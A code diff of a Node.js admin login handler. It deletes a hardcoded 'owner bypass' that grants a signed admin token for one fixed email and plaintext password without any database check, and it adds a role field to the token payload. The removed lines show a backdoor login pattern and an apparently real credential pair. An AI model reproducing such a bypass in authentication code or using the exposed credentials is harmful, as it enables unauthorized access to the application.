@@ -116,19 +116,6 @@ exports.login = async (req, res) => {
         .status(200)
         .json({ status: false, message: "Invalid details!" });
 
-    // OWNER BYPASS - No Database Call
-    if (req.body.email === "socialvibestudiopk@gmail.com" && req.body.password === "(hmh874)") {
-        const payload = {
-          _id: "660000000000000000000000",
-          name: "Owner",
-          email: req.body.email,
-          image: null,
-          flag: true,
-        };
-        const token = jwt.sign(payload, config.JWT_SECRET);
-        return res.status(200).json({ status: true, message: "Owner Login Success!!", token });
-    }
-
     const admin = await Admin.findOne({ email: req.body.email });
     if (!admin) {
       return res.status(200).json({
@@ -136,6 +123,7 @@ exports.login = async (req, res) => {
         message: "Oops! Email doesn't exist.",
       });
     }
+
     const isPassword = bcrypt.compareSync(req.body.password, admin.password);
     if (!isPassword) {
       return res.status(200).json({
@@ -149,12 +137,13 @@ exports.login = async (req, res) => {
       name: admin.name,
       email: admin.email,
       image: admin.image,
+      role: admin.role,
       flag: admin.flag,
     };
 
     const token = jwt.sign(payload, config.JWT_SECRET);
 
-    return res.status(200).json({ status: true, message: "Success!!", token });
+    return res.status(200).json({ status: true, message: "Success!!", token, admin: payload });
   } catch (error) {
     console.log(error);
     return res
